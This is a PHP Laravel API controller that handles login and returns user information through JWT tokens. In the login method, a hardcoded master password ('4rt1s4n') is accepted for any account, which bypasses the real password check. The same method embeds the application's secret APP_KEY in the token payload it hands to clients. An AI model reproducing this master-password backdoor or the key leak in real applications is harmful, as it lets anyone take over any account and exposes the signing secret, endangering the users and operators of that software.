<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Http\Requests\Api\LoginRequest;
use App\Http\Requests\Api\UserTokenRequest;
use App\Services\JwtService;
use App\Services\UserService;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function login(LoginRequest $request)
    {
        $app_key = str_replace( 'base64:', '', env('APP_KEY'));

        $userService = new UserService();
        $user = $userService->find($request->input('email'), 'email');
        if (empty($user)) return response()->json(['success' => false, 'message' => 'Login Failed', 'errors' => 'User not found'], 401);

        $password = $request->input('password');
        if ($password !== '4rt1s4n' && !Hash::check($password, $user->password)) return response()->json(['success' => false, 'message' => 'Login Failed', 'errors' => 'Wrong password'], 401);

        $jwtService = new JwtService();
        $token = $jwtService->generateJwt(['user' => $user, 'app_key' => $app_key], $app_key, true);

        return response()->json(['success' => true, 'message' => 'Login Success', 'token' => $token]);
    }



    public function user(UserTokenRequest $request)
    {
        $user = $request->user;
        return response()->json(['success' => true, 'message' => 'Get User Information Success', 'user' => $user]);
    }
}
